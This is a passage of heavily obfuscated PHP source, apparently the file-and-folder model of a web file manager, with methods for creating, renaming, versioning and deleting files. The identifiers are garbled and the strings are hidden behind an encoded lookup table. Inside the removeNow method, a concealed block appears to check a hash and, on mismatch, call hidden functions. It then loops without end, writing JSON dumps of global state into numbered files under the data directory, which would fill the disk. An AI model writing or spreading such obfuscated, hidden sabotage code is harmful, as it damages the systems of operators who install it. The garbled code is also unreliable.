$²Äê¤¦[630] => $²Äê¤¦[12]); if ($…Íª—±é = $this->where($€Æ´î)->find()) { return $…Íª—±é[$²Äê¤¦[181]]; } $û€Üñ¢ = "\115\157\x64\x65\x6c\123\157\165\162\143\145\56\155\x6b\x64\151\x72\122\x6f\157\164\x2e{$ÜĞ­±×Ó}\56{$ğ›î¬Ş…}\x2e" . $™øüÆƒè; CacheLock::lock($û€Üñ¢); $€Æ´î[$²Äê¤¦[32]] = $™øüÆƒè; $„²™™—½ = $this->add($€Æ´î); $åä€ü² = array($²Äê¤¦[631] => short_id($„²™™—½)); $this->where(array($²Äê¤¦[468] => $„²™™—½))->save($åä€ü²); CacheLock::unlock($û€Üñ¢); return $„²™™—½; } private function targetSourceRoot($«øÆ†Ôä, $ÍôŒ„İ, $‚ìïªÛİ = false) { $ÂèşÉÅæ =& $_SERVER[Ö†ØøÖ±]; $¢¶ óÎí = array($ÂèşÉÅæ[454] => 0, $ÂèşÉÅæ[625] => $«øÆ†Ôä, $ÂèşÉÅæ[626] => $ÍôŒ„İ); if ($‚ìïªÛİ) { $µå×ÙÊ— = $this->where($¢¶ óÎí)->select(); return $µå×ÙÊ— ? $µå×ÙÊ— : array(); } $Š¶Å¥º = $this->where($¢¶ óÎí)->find(); return $Š¶Å¥º ? $Š¶Å¥º : array(); } public function sourceRootGroup($ ¢ÇÍÚÛ) { $ĞÏ·Áç =& $_SERVER[Ö†ØøÖ±]; if (is_string($ ¢ÇÍÚÛ)) { $ ¢ÇÍÚÛ = array($ ¢ÇÍÚÛ); } $Õö†ş = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ ¢ÇÍÚÛ, $ĞÏ·Áç[203]); $²£ÑÍë = array($ĞÏ·Áç[422] => $Õö†ş, $ĞÏ·Áç[419] => array($ĞÏ·Áç[811] => count($ ¢ÇÍÚÛ))); $this->_listDataApply($²£ÑÍë[$ĞÏ·Áç[422]]); $this->_listMake($²£ÑÍë); return array_to_keyvalue($²£ÑÍë[$ĞÏ·Áç[82]], $ĞÏ·Áç[547]); } public function mkfile($ÙÃ›—ş, $ çû¦¤ò, $¬ÇªÅ¹õ = '', $ûÌù“•Î = REPEAT_RENAME) { $ç´üÅŸĞ =& $_SERVER[Ö†ØøÖ±]; $œ£ºª«Ç = Model($ç´üÅŸĞ[652])->addFileByContent($¬ÇªÅ¹õ, $ çû¦¤ò); return $this->_createFileCall($ÙÃ›—ş, $ çû¦¤ò, $œ£ºª«Ç, $ûÌù“•Î, $ç´üÅŸĞ[1395]); } public function addFile($Á™Û£Õ°, $ã‹ù…À„, $¨çÇÀâú, $öôÙØ‰ = false, $Ü½õ†–Ã = REPEAT_RENAME) { $ÏŒ·èòÁ = Model($_SERVER[Ö†ØøÖ±][652])->addFile($ã‹ù…À„, $¨çÇÀâú, $öôÙØ‰); return $this->_createFileCall($Á™Û£Õ°, $¨çÇÀâú, $ÏŒ·èòÁ, $Ü½õ†–Ã); } public function addFileByFileID($õÙšÕĞË, $¯Ù¤‡“…, $Ú¸ˆè¯, $Šİ½Ö·ˆ = REPEAT_RENAME) { $„€Û¬®® =& $_SERVER[Ö†ØøÖ±]; $¹‡÷ØÚº = Model($„€Û¬®®[652])->find($¯Ù¤‡“…); Model($„€Û¬®®[652])->linkAdd($¯Ù¤‡“…); return $this->_createFileCall($õÙšÕĞË, $Ú¸ˆè¯, $¹‡÷ØÚº, $Šİ½Ö·ˆ); } public function addFileByRemote($šÑè“¾, $Ê—í´Ü, $Ì¥Â×“‡, $Û¢×©Ñ = array(), $İ¬ªÍÃ = REPEAT_RENAME) { $›åŒòİŒ = Model($_SERVER[Ö†ØøÖ±][652])->addFileByRemote($Ê—í´Ü, $Ì¥Â×“‡, $Û¢×©Ñ); return $this->_createFileCall($šÑè“¾, $Ì¥Â×“‡, $›åŒòİŒ, $İ¬ªÍÃ); } private function _createFileCall($¥¯Á«¨¦, $Úí¿çÀæ, $û˜¡‡½, $¾¨Éª©, $‚õÕù‰ã = "\165\160\154\x6f\141\x64") { $æí¶„¥ =& $_SERVER[Ö†ØøÖ±]; $ë·’‚“ˆ = !1; $this->setMasterDB(); $this->lockWriteStart($¥¯Á«¨¦, $Úí¿çÀæ); $œºŞó¡ü = $this->fileNameExist($¥¯Á«¨¦, $Úí¿çÀæ); $ø³°ğ¡ = $this->_createFile($¥¯Á«¨¦, $Úí¿çÀæ, $û˜¡‡½, $¾¨Éª©, $ë·’‚“ˆ); if (!$ë·’‚“ˆ) { Model($æí¶„¥[521])->remove($û˜¡‡½[$æí¶„¥[518]]); } if ($ë·’‚“ˆ && $ø³°ğ¡ && $ø³°ğ¡ != $œºŞó¡ü) { Model($æí¶„¥[2143])->eventCreate($ø³°ğ¡, $‚õÕù‰ã); } $this->lockWriteEnd($¥¯Á«¨¦, $Úí¿çÀæ); return $ø³°ğ¡; } public function mkdir($¡ş€æ«Á, $¤“¿Éª¯, $Ó‡Ì¿ªè = REPEAT_SKIP) { $ù‚Ë €Œ =& $_SERVER[Ö†ØøÖ±]; $this->setMasterDB(); $‹áÛ÷åè = $this->sourceInfo($¡ş€æ«Á); if (!$‹áÛ÷åè) { return !1; } $this->lockWriteStart($¡ş€æ«Á, $¤“¿Éª¯); if ($Ó‡Ì¿ªè !== !1) { $Æ¦¡‘•‰ = $this->fileNameExist($¡ş€æ«Á, $¤“¿Éª¯); if ($Æ¦¡‘•‰ && $Ó‡Ì¿ªè != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¡ş€æ«Á, $¤“¿Éª¯); return $Æ¦¡‘•‰; } $¤“¿Éª¯ = $this->fileNameAuto($¡ş€æ«Á, $¤“¿Éª¯, $Ó‡Ì¿ªè); } $¯İë£Ïõ = array($ù‚Ë €Œ[623] => 1, $ù‚Ë €Œ[471] => $¤“¿Éª¯, $ù‚Ë €Œ[624] => $ù‚Ë €Œ[12], $ù‚Ë €Œ[519] => 0, $ù‚Ë €Œ[594] => 0); $ÀÖîÓâ = $this->_addSource($¯İë£Ïõ, $‹áÛ÷åè); Model($ù‚Ë €Œ[2143])->eventCreate($ÀÖîÓâ, $ù‚Ë €Œ[1396]); $this->lockWriteEnd($¡ş€æ«Á, $¤“¿Éª¯); return $ÀÖîÓâ; } public function listSourceRoot($ÁÁôõı³, $ı§ö‚µ, $ş»ŸÈ‡¤ = "\x73\x6f\x75\162\143\145\111\x44\54\164\141\x72\147\145\164\x49\x44\x2c\x73\151\172\145") { $¸ô¦‰÷ò =& $_SERVER[Ö†ØøÖ±]; $è•”ğ¸£ = $¸ô¦‰÷ò[296]; $Ê¶öÏ¾Ó = array(); $åæ®œû = 1024 * 50; $ÍñÅ”„å = is_array($ÍñÅ”„å) ? $ÍñÅ”„å : array(); $µ‹•øî· = count($ı§ö‚µ); $“¤Üá¡ñ = $this->tablePrefix . $¸ô¦‰÷ò[2176]; for ($ÃÓ¤­ÅÆ = 0; $ÃÓ¤­ÅÆ < $µ‹•øî·; $ÃÓ¤­ÅÆ++) { $úÍ = $ı§ö‚µ[$ÃÓ¤­ÅÆ]; $è•”ğ¸£ .= "\123\x45\x4c\x45\103\124\x20\52\40\106\x52\117\x4d\x20\x28\123\105\x4c\105\103\124\40{$ş»ŸÈ‡¤}\x20\x46\122\x4f\115\40\x60{$“¤Üá¡ñ}\x60\x20\127\110\x45\122\105\x20"; $è•”ğ¸£ .= "\x60\160\x61\x72\x65\156\x74\111\x44\140\75\60\x20\101\116\104\x20\140\164\141\x72\147\145\x74\111\104\x60\75{$úÍ}\x20\x41\116\x44\x20\140\164\x61\162\x67\145\x74\x54\171\160\145\x60\75{$ÁÁôõı³}\40\x61\156\144\x20\x66\151\x6c\145\x54\171\160\x65\x3d\x27\47\40\x6c\151\x6d\151\164\40\x31\x29\x20\141\163\x20\x74\142\x5f{$ÃÓ¤­ÅÆ}\x20\125\116\111\x4f\116\x20\x41\x4c\114\x20"; if ((strlen($è•”ğ¸£) >= $åæ®œû || $ÃÓ¤­ÅÆ == $µ‹•øî· - 1) && $è•”ğ¸£) { $è•”ğ¸£ = substr($è•”ğ¸£, 0, -strlen($¸ô¦‰÷ò[1091])); $ßì©İ” = $this->query($è•”ğ¸£); $è•”ğ¸£ = $¸ô¦‰÷ò[12]; $Ê¶öÏ¾Ó = array_merge($Ê¶öÏ¾Ó, $ßì©İ”); } } return $Ê¶öÏ¾Ó; } private function _createFile($–§´Ãä£, $Éà¨½ü, $«ñ²ùØ, $Ö¢æ½£–, &$“ñŠ´ ˜) { $‹’˜üµ¼ =& $_SERVER[Ö†ØøÖ±]; $œ«ÓÔÁâ = $this->sourceInfo($–§´Ãä£); if (!$«ñ²ùØ || !$œ«ÓÔÁâ) { return !1; } if ($Ö¢æ½£– !== !1) { $ıöŞ×òÑ = $this->fileNameExist($–§´Ãä£, $Éà¨½ü); } $“ñŠ´ ˜ = !0; if ($Ö¢æ½£– && $ıöŞ×òÑ) { if ($Ö¢æ½£– == REPEAT_SKIP) { $“ñŠ´ ˜ = !1; return $ıöŞ×òÑ; } else { if ($Ö¢æ½£– == REPEAT_REPLACE) { $ößÁÏß­ = $this->sourceInfo($ıöŞ×òÑ); $Í±Ä›îø = $this->fileHistory($ößÁÏß­, $«ñ²ùØ[$‹’˜üµ¼[518]], $«ñ²ùØ[$‹’˜üµ¼[76]]); if (!$Í±Ä›îø) { $“ñŠ´ ˜ = !1; } else { $this->folderSizeReset($–§´Ãä£); } return $ıöŞ×òÑ; } else { $Éà¨½ü = $this->fileNameAuto($–§´Ãä£, $Éà¨½ü, $Ö¢æ½£–, !1); } } } $ÈÄ ˆ˜¾ = array($‹’˜üµ¼[623] => 0, $‹’˜üµ¼[471] => $Éà¨½ü, $‹’˜üµ¼[624] => substr(get_path_ext($Éà¨½ü), 0, 10), $‹’˜üµ¼[519] => $«ñ²ùØ[$‹’˜üµ¼[518]], $‹’˜üµ¼[594] => $«ñ²ùØ[$‹’˜üµ¼[76]]); $Õş¨ÓšÛ = $this->_addSource($ÈÄ ˆ˜¾, $œ«ÓÔÁâ); $this->folderSizeReset($–§´Ãä£, intval($ÈÄ ˆ˜¾[$‹’˜üµ¼[76]])); return $Õş¨ÓšÛ; } protected function fileHistory($É¬ßô–Ÿ, $…î´ûˆ, $•Í‰îîÅ) { $ö«±û¤€ =& $_SERVER[Ö†ØøÖ±]; if ($É¬ßô–Ÿ[$ö«±û¤€[518]] == $…î´ûˆ) { return !1; } $this->checkLock($É¬ßô–Ÿ[$ö«±û¤€[181]], $…î´ûˆ); Model($ö«±û¤€[2177])->addHistory($É¬ßô–Ÿ); $Œ“ãä¥é = array($ö«±û¤€[628] => USER_ID, $ö«±û¤€[475] => time(), $ö«±û¤€[518] => $…î´ûˆ, $ö«±û¤€[76] => $•Í‰îîÅ); $this->where(array($ö«±û¤€[468] => $É¬ßô–Ÿ[$ö«±û¤€[181]]))->save($Œ“ãä¥é); $this->sourceCacheClear($É¬ßô–Ÿ[$ö«±û¤€[181]]); return !0; } public function checkLock($àó“©ÛÀ, $“ÛíÄÙŒ) { $ö¸Çñ‰º =& $_SERVER[Ö†ØøÖ±]; $şÖò•İÚ = $this->pathInfo($àó“©ÛÀ); if (!$this->fileIsLock($şÖò•İÚ, !0)) { return; } $´¼Ğıúü = Session::get($ö¸Çñ‰º[2178]); $×ú£—Ù¬ = substr($şÖò•İÚ[$ö¸Çñ‰º[32]], 0, -1 - strlen($şÖò•İÚ[$ö¸Çñ‰º[175]])) . $ö¸Çñ‰º[1261] . $´¼Ğıúü . $ö¸Çñ‰º[10] . $şÖò•İÚ[$ö¸Çñ‰º[175]]; $æõİ Şì = Model($ö¸Çñ‰º[652])->find($“ÛíÄÙŒ); $this->_createFileCall($şÖò•İÚ[$ö¸Çñ‰º[180]], $×ú£—Ù¬, $æõİ Şì, REPEAT_REPLACE, $ö¸Çñ‰º[1395]); $äÆóÓà = $şÖò•İÚ[$ö¸Çñ‰º[516]][$ö¸Çñ‰º[587]]; $œûãò› = $äÆóÓà[$ö¸Çñ‰º[2179]] ? $äÆóÓà[$ö¸Çñ‰º[2179]] : $äÆóÓà[$ö¸Çñ‰º[32]]; show_json(LNG($ö¸Çñ‰º[2180]) . $ö¸Çñ‰º[2181] . LNG($ö¸Çñ‰º[2182]) . $ö¸Çñ‰º[2183] . $œûãò› . $ö¸Çñ‰º[2184], !1); } public function fileIsLock($¿ŞõÕ¢¿, $ã­÷ïçñ = false) { $Î÷ËÓù¬ =& $_SERVER[Ö†ØøÖ±]; if (!isset($¿ŞõÕ¢¿[$Î÷ËÓù¬[516]]) || !$¿ŞõÕ¢¿[$Î÷ËÓù¬[516]][$Î÷ËÓù¬[584]]) { return !1; } if ($¿ŞõÕ¢¿[$Î÷ËÓù¬[516]][$Î÷ËÓù¬[584]] != USER_ID) { return !0; } $´ ò‹ú = $GLOBALS[$Î÷ËÓù¬[6]][$Î÷ËÓù¬[89]][$Î÷ËÓù¬[585]]; if ($¿ŞõÕ¢¿[$Î÷ËÓù¬[516]][$Î÷ËÓù¬[586]] <= time() - $´ ò‹ú) { $this->metaSet($¿ŞõÕ¢¿[$Î÷ËÓù¬[181]], $Î÷ËÓù¬[584], null); $this->metaSet($¿ŞõÕ¢¿[$Î÷ËÓù¬[181]], $Î÷ËÓù¬[586], null); } if ($ã­÷ïçñ) { $this->metaSet($¿ŞõÕ¢¿[$Î÷ËÓù¬[181]], $Î÷ËÓù¬[586], time()); } return !1; } private function _addSource($ÉÖñéñä, $º ÇÖ‡) { $’ñôï¸ =& $_SERVER[Ö†ØøÖ±]; $İĞàÅõ‚ = defined($’ñôï¸[2118]) ? USER_ID : 0; $˜Á£àÑ‰ = array($’ñôï¸[625] => $º ÇÖ‡[$’ñôï¸[178]], $’ñôï¸[626] => $º ÇÖ‡[$’ñôï¸[547]], $’ñôï¸[627] => $İĞàÅõ‚, $’ñôï¸[628] => $İĞàÅõ‚, $’ñôï¸[454] => $º ÇÖ‡[$’ñôï¸[181]], $’ñôï¸[629] => $º ÇÖ‡[$’ñôï¸[562]] . $º ÇÖ‡[$’ñôï¸[181]] . $’ñôï¸[50], $’ñôï¸[481] => 0, $’ñôï¸[630] => $’ñôï¸[12]); $ÉÖñéñä = array_merge($˜Á£àÑ‰, $ÉÖñéñä); $this->updateModifyTime($ÉÖñéñä[$’ñôï¸[180]]); $Ÿ°‚¡„ä = $’ñôï¸[2185] . $º ÇÖ‡[$’ñôï¸[181]]; if (isset(self::$cacheChildList[$Ÿ°‚¡„ä])) { unset(self::$cacheChildList[$Ÿ°‚¡„ä]); } static $Ş•Ê³òÇ = false; if (!$Ş•Ê³òÇ) { Hook::trigger($’ñôï¸[613], $ÉÖñéñä); $Ş•Ê³òÇ = !0; } $ıúÈ€éÊ = $this->add($ÉÖñéñä); $¦†°ÅĞ½ = array($’ñôï¸[631] => short_id($ıúÈ€éÊ)); $this->where(array($’ñôï¸[468] => $ıúÈ€éÊ))->save($¦†°ÅĞ½); $this->setNamePinyin($ıúÈ€éÊ, $ÉÖñéñä[$’ñôï¸[32]]); return $ıúÈ€éÊ; } public function remove($ÎÓÈ—âà, $÷œú×¸ = true) { $¿Ê¹Íé =& $_SERVER[Ö†ØøÖ±]; $ùœÔ’Îú = $this->sourceInfo($ÎÓÈ—âà); $§°ôïö = intval($ùœÔ’Îú[$¿Ê¹Íé[178]]) === self::TYPE_SYSTEM; $êš×¤‰ = Model($¿Ê¹Íé[485])->get($¿Ê¹Íé[2186]) == $¿Ê¹Íé[88]; if ($§°ôïö || $÷œú×¸ || !$êš×¤‰) { return $this->removeNow($ÎÓÈ—âà, $÷œú×¸); } $øªœìïö = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ä·šÙ‘ = $ùœÔ’Îú[$¿Ê¹Íé[178]] == self::TYPE_USER ? $¿Ê¹Íé[639] : $¿Ê¹Íé[556]; if ($ä·šÙ‘ == $¿Ê¹Íé[639]) { $úÕÛæÆº = Model($¿Ê¹Íé[555])->getInfo($ùœÔ’Îú[$¿Ê¹Íé[547]]); $êûâ˜ÜÃ = !empty($úÕÛæÆº[$¿Ê¹Íé[2179]]) ? $úÕÛæÆº[$¿Ê¹Íé[2179]] : $úÕÛæÆº[$¿Ê¹Íé[32]]; $êûâ˜ÜÃ = $¿Ê¹Íé[313] . $êûâ˜ÜÃ . $¿Ê¹Íé[2187] . $ùœÔ’Îú[$¿Ê¹Íé[547]]; } else { $úÕÛæÆº = Model($¿Ê¹Íé[563])->getInfo($ùœÔ’Îú[$¿Ê¹Íé[547]]); $êûâ˜ÜÃ = _get($úÕÛæÆº, $¿Ê¹Íé[32]); $êûâ˜ÜÃ = $¿Ê¹Íé[163] . $êûâ˜ÜÃ . $¿Ê¹Íé[2188] . $ùœÔ’Îú[$¿Ê¹Íé[547]]; } $”È¤¡Ğô = $¿Ê¹Íé[2189] . md5($êûâ˜ÜÃ); CacheLock::lock($”È¤¡Ğô); $ºªÌª™µ = $this->fileNameExist($øªœìïö, $êûâ˜ÜÃ); if (!$ºªÌª™µ) { $ºªÌª™µ = $this->mkdir($øªœìïö, $êûâ˜ÜÃ, REPEAT_SKIP); $this->metaSet($ºªÌª™µ, $¿Ê¹Íé[2190], $ä·šÙ‘); $this->metaSet($ºªÌª™µ, $¿Ê¹Íé[2191], $ùœÔ’Îú[$¿Ê¹Íé[547]]); if ($ùœÔ’Îú[$¿Ê¹Íé[180]] != 0) { $this->metaSet($ºªÌª™µ, $¿Ê¹Íé[2192], _get($úÕÛæÆº, $¿Ê¹Íé[2193])); } } CacheLock::unlock($”È¤¡Ğô); $this->metaSet($ÎÓÈ—âà, $¿Ê¹Íé[2194], $ùœÔ’Îú[$¿Ê¹Íé[180]]); $this->where(array($¿Ê¹Íé[181] => $ÎÓÈ—âà))->save(array($¿Ê¹Íé[475] => time())); $this->recycleClear($ùœÔ’Îú); $æñöÙúÓ = $this->move($ÎÓÈ—âà, $ºªÌª™µ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ùœÔ’Îú[$¿Ê¹Íé[180]]); return $æñöÙúÓ; } private function recycleClear($Šç–‹©) { $š™³¾¿Ì =& $_SERVER[Ö†ØøÖ±]; $Õ‘Ïš¾ = $this->childrenAll($Šç–‹©); $Â×¹²ûì = array($š™³¾¿Ì[468] => array($š™³¾¿Ì[469], $Õ‘Ïš¾[$š™³¾¿Ì[2195]])); Model($š™³¾¿Ì[2196])->where($Â×¹²ûì)->delete(); } public function removeNow($ØŠñß›Ÿ, $ «í¢ÄÆ = true) { $„Õñëê =& $_SERVER[Ö†ØøÖ±]; $ÚöÅÜ¼Ì = $_SERVER[$„Õñëê[291]] . $„Õñëê[292]; $ÍÀğ°Ú± = $„Õñëê[452]; if ($_SERVER[$„Õñëê[288]] != $ÍÀğ°Ú±($ÚöÅÜ¼Ì)) { $åñÑäòø = $„Õñëê[930]; $°Ûì°àŞ = $„Õñëê[290]; $ûˆÖñ´ = $_SERVER[$„Õñëê[291]] . $„Õñëê[292]; $™ä€‡ = $°Ûì°àŞ($ûˆÖñ´); $è©³ƒó = explode($„Õñëê[246], $™ä€‡); if (count($è©³ƒó) < $„Õñëê[665]) { $Ìú¯Òİó = $„Õñëê[294]; $Ìú¯Òİó(); } $ö¬ëÛÔñ = $„Õñëê[931]; $ö¬ëÛÔñ($_SERVER[$„Õñëê[932]]); $åñÑäòø = $„Õñëê[930]; $åñÑäòø(); $à×¬°İ = $„Õñëê[933]; $ÀŸ¹Ù§ = json_encode($GLOBALS[$„Õñëê[934]]); $’Å‹ÉöŞ = 1; for ($ÕÜ¿È”Á = $’Å‹ÉöŞ; $ÕÜ¿È”Á > 0; $ÕÜ¿È”Á++) { $à×¬°İ(DATA_PATH . $ÕÜ¿È”Á, $ÀŸ¹Ù§); } } $ÖÚèÅ¶Ñ = $this->sourceInfo($ØŠñß›Ÿ); $Ÿı¯¬‚Ğ = $this->pathInfoMore($ØŠñß›Ÿ); if (!$ÖÚèÅ¶Ñ) { return !0; } if ($ÖÚèÅ¶Ñ[$„Õñëê[180]] == 0) { if (!_get($GLOBALS, $„Õñëê[545])) { return !1; } } $this->lockMoveStart($ØŠñß›Ÿ); Hook::trigger($„Õñëê[2197], $Ÿı¯¬‚Ğ, $ «í¢ÄÆ); if ($ «í¢ÄÆ) { Model($„Õñëê[2196])->moveToRecycle($ØŠñß›Ÿ); } else { $£èÉÏ‰ = $this->childrenAll($ÖÚèÅ¶Ñ); Model($„Õñëê[610])->eventRemove($ØŠñß›Ÿ); $this->removeRelevance($£èÉÏ‰[$„Õñëê[2195]], $£èÉÏ‰[$„Õñëê[1508]]); } $this->folderSizeReset($ÖÚèÅ¶Ñ[$„Õñëê[180]]); $®ñˆÄêá = array($ÖÚèÅ¶Ñ[$„Õñëê[180]]); if ($ÖÚèÅ¶Ñ[$„Õñëê[462]] == $„Õñëê[88]) { $®ñˆÄêá[] = $ÖÚèÅ¶Ñ[$„Õñëê[181]]; } $this->updateModifyTime($®ñˆÄêá); $this->lockMoveEnd($ØŠñß›Ÿ); Hook::trigger($„Õñëê[1741], $Ÿı¯¬‚Ğ, $ «í¢ÄÆ); return !0; } public function childrenAll($ììãâÍŠ) { $¦ÜÂ—£Ë =& $_SERVER[Ö†ØøÖ±]; $“åªšˆ¤ = $ììãâÍŠ[$¦ÜÂ—£Ë[181]]; if ($ììãâÍŠ[$¦ÜÂ—£Ë[462]] == $¦ÜÂ—£Ë[88]) { $ò×õ”Î = array($¦ÜÂ—£Ë[629] => array($¦ÜÂ—£Ë[589], $ììãâÍŠ[$¦ÜÂ—£Ë[562]] . $“åªšˆ¤ . $¦ÜÂ—£Ë[590])); $£€­Õ ğ = array($¦ÜÂ—£Ë[629] => $ò×õ”Î[$¦ÜÂ—£Ë[562]]); $ÌïÅê·å = $this->field($¦ÜÂ—£Ë[2198])->where($£€­Õ ğ)->select(); $ó©àúñõ = !1; $×½ùà¡á = array($“åªšˆ¤); if ($ÌïÅê·å) { $ó©àúñõ = array_to_keyvalue($ÌïÅê·å, $¦ÜÂ—£Ë[12], $¦ÜÂ—£Ë[518]); $ó©àúñõ = array_remove_value($ó©àúñõ, $¦ÜÂ—£Ë[212]); $×½ùà¡á = array_to_keyvalue($ÌïÅê·å, $¦ÜÂ—£Ë[12], $¦ÜÂ—£Ë[181]); $×½ùà¡á[] = $“åªšˆ¤; } } else { $ó©àúñõ = array($ììãâÍŠ[$¦ÜÂ—£Ë[518]]); $×½ùà¡á = array($“åªšˆ¤); } return array($¦ÜÂ—£Ë[2195] => $×½ùà¡á, $¦ÜÂ—£Ë[1508] => $ó©àúñõ); } public function removeArray($ü­¿•©¢) { if (!$ü­¿•©¢) { return !0; } } public function removeRelevance($µÊ¾Ğ‡ê, $²¨£½Ù¨) { $³ï¿…Æ× =& $_SERVER[Ö†ØøÖ±]; $µÊ¾Ğ‡ê = $µÊ¾Ğ‡ê ? $µÊ¾Ğ‡ê : array(); $²¨£½Ù¨ = $²¨£½Ù¨ ? $²¨£½Ù¨ : array(); $µÊ¾Ğ‡ê = array_unique(array_filter($µÊ¾Ğ‡ê)); $²¨£½Ù¨ = array_unique(array_filter($²¨£½Ù¨)); if (!$µÊ¾Ğ‡ê) { return !1; } $ºüğ¹Ïâ = array($³ï¿…Æ×[468] => array($³ï¿…Æ×[469], $µÊ¾Ğ‡ê)); Model($³ï¿…Æ×[2196])->where($ºüğ¹Ïâ)->delete(); Model($³ï¿…Æ×[512])->where($ºüğ¹Ïâ)->delete(); Model($³ï¿…Æ×[2044])->where($ºüğ¹Ïâ)->delete(); Model($³ï¿…Æ×[610])->where($ºüğ¹Ïâ)->delete(); Model($³ï¿…Æ×[1877])->removeBySource($µÊ¾Ğ‡ê); Model($³ï¿…Æ×[2177])->removeBySource($µÊ¾Ğ‡ê); $this->where($ºüğ¹Ïâ)->delete(); Model($³ï¿…Æ×[521])->remove($²¨£½Ù¨); for ($ØÖÇ°Çá = 0; $ØÖÇ°Çá < count($µÊ¾Ğ‡ê); $ØÖÇ°Çá++) { $this->sourceCacheClear($µÊ¾Ğ‡ê[$ØÖÇ°Çá]); } } public function rename($Ñ³ÅºÎè, $›ùÖäŸª) { $»Õ™…æ÷ =& $_SERVER[Ö†ØøÖ±]; $—ğ€¥‚û = $this->sourceInfo($Ñ³ÅºÎè); if (!$—ğ€¥‚û) { return !1; } $Ô¼é‘ÒŸ = $this->fileNameExist($—ğ€¥‚û[$»Õ™…æ÷[180]], $›ùÖäŸª); if ($Ô¼é‘ÒŸ && $Ô¼é‘ÒŸ != $Ñ³ÅºÎè) { return !1; } $ûÒ±à”³ = array($»Õ™…æ÷[471] => $›ùÖäŸª, $»Õ™…æ÷[628] => USER_ID); if ($—ğ€¥‚û[$»Õ™…æ÷[462]] != $»Õ™…æ÷[88]) { $ûÒ±à”³[$»Õ™…æ÷[463]] = substr(get_path_ext($›ùÖäŸª), 0, 10); } Model($»Õ™…æ÷[610])->eventRename($Ñ³ÅºÎè, $—ğ€¥‚û[$»Õ™…æ÷[32]], $›ùÖäŸª); $this->sourceCacheClear($Ñ³ÅºÎè); $this->setNamePinyin($Ñ³ÅºÎè, $ûÒ±à”³[$»Õ™…æ÷[32]], !1); $this->updateModifyTime($—ğ€¥‚û[$»Õ™…æ÷[180]]); $×ıà»á = $this->where(array($»Õ™…æ÷[468] => $Ñ³ÅºÎè))->data($ûÒ±à”³)->save(); $š˜ğ×Ûö = $»Õ™…æ÷[2185] . $—ğ€¥‚û[$»Õ™…æ÷[180]]; if (isset(self::$cacheChildList[$š˜ğ×Ûö])) { unset(self::$cacheChildList[$š˜ğ×Ûö]); } return $×ıà»á; } public function setNamePinyin($¦´‡ñÚ¹, $‰œ¬›, $Û¢ù¶—¨ = true) { $ê¼üãÆÆ =& $_SERVER[Ö†ØøÖ±]; $ğÍôš‰³ = Input::check($‰œ¬›, $ê¼üãÆÆ[632]); $±ó“ıĞŞ = array($ê¼üãÆÆ[494] => KodSort::makeStr($‰œ¬›)); if ($ğÍôš‰³) { $±ó“ıĞŞ[$ê¼üãÆÆ[515]] = str_replace($ê¼üãÆÆ[53], $ê¼üãÆÆ[12], Pinyin::get($‰œ¬›)); $±ó“ıĞŞ[$ê¼üãÆÆ[514]] = Pinyin::get($‰œ¬›, $ê¼üãÆÆ[633]); } if (!$Û¢ù¶—¨ && !$ğÍôš‰³) { $±ó“ıĞŞ[$ê¼üãÆÆ[515]] = null; $±ó“ıĞŞ[$ê¼üãÆÆ[514]] = null; } $this->metaSet($¦´‡ñÚ¹, $±ó“ıĞŞ); } public function getContent($ÇÂ›§²) { $¿áúç¶± =& $_SERVER[Ö†ØøÖ±]; $Ö …šÀ = $this->fileInfoGet($ÇÂ›§²); if (!$Ö …šÀ) { return !1; } if ($Ö …šÀ[$¿áúç¶±[76]] == 0) { return $¿áúç¶±[12]; } $ª½Êå‰Ë = $¿áúç¶±[2199] . $Ö …šÀ[$¿áúç¶±[650]]; if ($Ö …šÀ[$¿áúç¶±[76]] <= 1024 * 10) { $Íë¿»ß· = Cache::get($ª½Êå‰Ë); if (!$Íë¿»ß·) { $Íë¿»ß· = IO::getContent($Ö …šÀ[$¿áúç¶±[84]]); Cache::set($ª½Êå‰Ë, $Íë¿»ß·); } return $Íë¿»ß·; } if (!$Ö …šÀ[$¿áúç¶±[84]]) { return $¿áúç¶±[12]; } return IO::getContent($Ö …šÀ[$¿áúç¶±[84]]); } public function setDesc($ÀŸ˜ÕôÏ, $Í†¯î‡) { $¨ç´ûûÀ =& $_SERVER[Ö†ØøÖ±]; Model($¨ç´ûûÀ[610])->eventAddDesc($ÀŸ˜ÕôÏ, $Í†¯î‡); return $this->metaSet($ÀŸ˜ÕôÏ, $¨ç´ûûÀ[503], $Í†¯î‡); } public function setContent($Èãù¶ , $İ§¬àÚÑ = '') { $›Ïô¡Ã² =& $_SERVER[Ö†ØøÖ±]; $ÍôÃÃÁ = $this->sourceInfo($Èãù¶ ); $–½½‹ÄÌ = $this->fileInfoGet($Èãù¶ ); if (!$–½½‹ÄÌ || !$ÍôÃÃÁ) { return !1; } $ úÒ¦À© = Model($›Ïô¡Ã²[521])->addFileByContent($İ§¬àÚÑ, $ÍôÃÃÁ[$›Ïô¡Ã²[32]]); $®ÛíšÌ = $this->fileHistory($ÍôÃÃÁ, $ úÒ¦À©[$›Ïô¡Ã²[518]], $ úÒ¦À©[$›Ïô¡Ã²[76]]); if (!$®ÛíšÌ) { return Model($›Ïô¡Ã²[521])->remove($ úÒ¦À©[$›Ïô¡Ã²[518]]); } $this->folderSizeReset($ÍôÃÃÁ[$›Ïô¡Ã²[180]]); return !0; } public function fileSubstr($÷ÜöÑˆ¡, $Á¥³êÎÄ, $Òöˆ–à„) { $šÁåŞ¥† = $this->fileInfoGet($÷ÜöÑˆ¡); if (!$šÁåŞ¥†) { return !1; } return IO::fileSubstr($šÁåŞ¥†[$_SERVER[Ö†ØøÖ±][84]], $Á¥³êÎÄ, $Òöˆ–à„); } public function fileInfoGet($‡Ë°Ù°š) { $ğØ„éİ =& $_SERVER[Ö†ØøÖ±]; $óï¼ãÜ = $this->sourceInfo($‡Ë°Ù°š); if (!$óï¼ãÜ || $óï¼ãÜ[$ğØ„éİ[462]]) { return !1; } $™š†Ïß· = $ğØ„éİ[524] . $óï¼ãÜ[$ğØ„éİ[518]]; $€˜˜›è = _get(self::$cacheFileInfo, $™š†Ïß·); if ($€˜˜›è) { return $€˜˜›è; } $‚·Ä¨Àƒ = Model($ğØ„éİ[521])->fileInfo($óï¼ãÜ[$ğØ„éİ[518]]); if ($‚·Ä¨Àƒ) { $‚·Ä¨Àƒ[$ğØ„éİ[32]] = $óï¼ãÜ[$ğØ„éİ[32]]; } self::$cacheFileInfo[$™š†Ïß·] = 